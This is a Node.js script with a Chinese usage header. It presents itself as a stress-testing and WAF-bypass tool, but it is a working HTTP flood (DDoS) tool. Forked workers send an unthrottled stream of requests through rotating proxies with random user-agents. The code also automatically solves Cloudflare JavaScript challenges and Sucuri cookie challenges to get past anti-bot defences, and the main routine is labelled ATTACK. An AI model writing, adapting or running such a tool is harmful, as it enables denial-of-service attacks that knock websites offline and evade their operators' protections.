/**
 * 实现了一个多线程的HTTP请求工具，主要用于通过代理进行目标网站的访问和绕过某些防护机制（如WAF）。它支持多个请求方法，包括 GET 和 POST，并可以通过代理池、随机 User-Agent 和动态请求参数（如随机字符串和当前时间）来模拟各种访问行为。该工具适用于需要通过HTTP请求进行压力测试或者绕过安全防护的场景，能够有效规避一些基本的防护策略。

功能特点
代理池支持：可以通过代理池进行请求，增强请求的匿名性。
多线程支持：使用cluster模块实现多线程，提升请求效率。
绕过WAF保护：通过模拟浏览器请求、解决JS挑战等方式绕过网站的WAF防护。
自定义User-Agent和请求参数：自动生成随机的User-Agent，支持动态替换请求中的参数。
请求类型支持：支持GET、POST等多种HTTP请求方法。
高可配置性：可以自定义代理地址、请求方式、请求头等参数，支持命令行配置。
定时任务：支持设置持续请求的时间，定时执行指定操作。
使用方法
安装依赖

在开始使用之前，需要安装以下依赖：

bash
复制代码
npm install random-useragent randomstring request
运行方式

在终端中通过以下命令运行工具：

bash
复制代码
node yourscript.js <target-url> <time-in-seconds> <num-threads> <proxy-file> <method> <http-method>
参数说明：

<target-url>：目标网站的URL。
<time-in-seconds>：运行时间（单位：秒）。
<num-threads>：启动的线程数。
<proxy-file>：包含代理IP的文件路径。
<method>：请求方法（如GET或POST）。
<http-method>：使用的HTTP方法。
执行步骤

该脚本启动时，会根据提供的代理池、目标URL等信息，通过多线程进行请求。
在运行过程中，会自动通过代理池选择IP、随机生成User-Agent和请求参数，以模拟真实用户的请求行为。
如果遇到验证码或者页面跳转，工具会尝试自动解决挑战。
示例命令

bash
复制代码
node yourscript.js "http://example.com" 60 10 "proxies.txt" GET POST
输出

每个请求的响应状态码将被输出到控制台，便于实时监控请求情况。
支持对错误、验证码、页面跳转等情况的处理，并显示相关的错误信息。
注意事项
确保代理池中的代理IP是有效的。
确保目标网站允许进行压力测试，以避免违规行为。
根据实际需要调整线程数和请求频率，避免对目标网站造成过大压力。
 */


process.on('uncaughtException', (err) => { });
process.on('unhandledRejection', (err) => { });
var random_useragent = require('random-useragent');
const randstr = require('randomstring')
var vm = require('vm');
var colors = require('colors');
const cluster = require('cluster');
var requestModule = require('request');
var jar = requestModule.jar();
var fs = require('fs');
var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');
//var userAgents = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
function arrremove(arr, what) {
    var found = arr.indexOf(what);

    while (found !== -1) {
        arr.splice(found, 1);
        found = arr.indexOf(what);
    }
}
if (process.argv[7] == null) {
    function ra() {
        const rsdat = randstr.generate({
            "charset": "123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
            "length": 8
        });
        return rsdat
    }
} else {
    function ra() {
        const rsdat = Date.now();
        return rsdat
    }
}
var request = requestModule.defaults({
    jar: jar
}),
    UserAgent = random_useragent.getRandom(),
    Timeout = 6000,
    WAF = true,
    cloudscraper = {};
var cookies = [];
cloudscraper.get = function (url, callback, headers) {
    performRequest({
        method: 'GET',
        url: url.replace(/\[rand\]/g, ra()),
        headers:
        {
            "Upgrade-Insecure-Requests": "1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Via": "1.0 PROXY",
            "Connection": "keep-alive",
        },
    }, callback);
};

let fakeip = '';
cloudscraper.post = function (url, body, callback, headers) {
    var data = '',
        bodyType = Object.prototype.toString.call(body);

    if (bodyType === '[object String]') {
        data = body;
    } else if (bodyType === '[object Object]') {
        data = Object.keys(body).map(function (key) {
            return key + '=' + body[key];
        }).join('&');
    }
    performRequest({
        method: 'POST',
        body: data,
        url: url.replace(/\[rand\]/g, ra()),
        headers: {
            "Upgrade-Insecure-Requests": "1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Via": "1.0 PROXY",
            "Connection": "keep-alive",
        },

    }, callback);
}

cloudscraper.request = function (options, callback) {
    performRequest(options, callback);
}

function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};

    options.headers['Cache-Control'] = options.headers['Cache-Control'] || 'private';
    options.headers['Accept'] = options.headers['Accept'] || 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5';

    makeRequest = requestMethod(options.method);

    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('');
    }

    options.headers['User-Agent'] = options.headers['User-Agent'] || UserAgent;

    makeRequest(options, function (error, response, body) {
        var validationError;
        var stringBody;

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');

        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }

        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function () {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('You are being redirected') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function checkForErrors(error, body) {
    var match;

    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }

    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }

    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }

    return false;
}


function solveChallenge(response, body, options, callback) {
    var challenge = body.match(/name="jschl_vc" value="(\w+)"/),
        host = response.request.host,
        makeRequest = requestMethod(options.method),
        jsChlVc,
        answerResponse,
        answerUrl;

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract challengeId (jschl_vc) from page'
        }, body, response);
    }

    jsChlVc = challenge[1];

    challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract method from setTimeOut wrapper'
        }, body, response);
    }

    challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];

    challenge = challenge[1];

    challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');

    challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
    challenge = challenge.replace(/'; \d+'/g, '');

    try {
        answerResponse = {
            'jschl_vc': jsChlVc,
            'jschl_answer': (eval(challenge) + response.request.host.length),
            'pass': challenge_pass
        };
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }

    answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl';

    options.headers['Referer'] = response.request.uri.href;
    options.url = answerUrl;
    options.qs = answerResponse;

    makeRequest(options, function (error, response, body) {

        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }

        if (response.statusCode === 302) {
            options.url = response.headers.location;
            delete options.qs;
            makeRequest(options, function (error, response, body) {
                processResponseBody(options, error, response, body, callback);
            });
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function setCookieAndReload(response, body, options, callback) {
    var challenge = body.match(/S='([^']+)'/);
    var makeRequest = requestMethod(options.method);

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract cookie generation code from page'
        }, body, response);
    }

    var base64EncodedCode = challenge[1];
    var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');

    var sandbox = {
        location: {
            reload: function () { }
        },
        document: {}
    };
    vm.runInNewContext(cookieSettingCode, sandbox);
    try {
        cookies.push(sandbox.document.cookie);
        jar.setCookie(sandbox.document.cookie, response.request.uri.href, {
            ignoreError: true
        });
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }

    makeRequest(options, function (error, response, body) {
        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }
        processResponseBody(options, error, response, body, callback);
    });
}

function requestMethod(method) {
    method = method.toUpperCase();

    return method === 'POST' ? request.post : request.get;
}

function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }


    callback(error, response, body);
}

var sum = 0;
var ATTACK = {

    cfbypass(method, url, proxy) {
        performRequest({
            method: method,
            proxy: 'http://' + proxy,
            url: url.replace(/\[rand\]/g, ra())
        }, function (err, response, body) {
            console.log(response.statusCode);
        });
    }
}

if (cluster.isMaster) {
    for (let i = 0; i < process.argv[5]; i++) {
        cluster.fork();
    }
    console.log(colors.blue("HTTP-Bypass方法运行中......"));
    console.log(colors.blue("HTTP-Bypass方法运行中......"));
    console.log(colors.blue("HTTP-Bypass方法运行中......"));
    console.log(colors.red("目标:" + process.argv[2]));
    console.log(colors.green("代理:" + proxies.length + "个"));
    console.log(colors.yellow("时间:" + process.argv[3] + "秒"));
    setTimeout(function () {
        process.exit(1);
    }, process.argv[3] * 1000);

}
setInterval(function () {
    ATTACK.cfbypass(process.argv[6], process.argv[2], proxies[Math.floor(Math.random() * proxies.length)]);

});
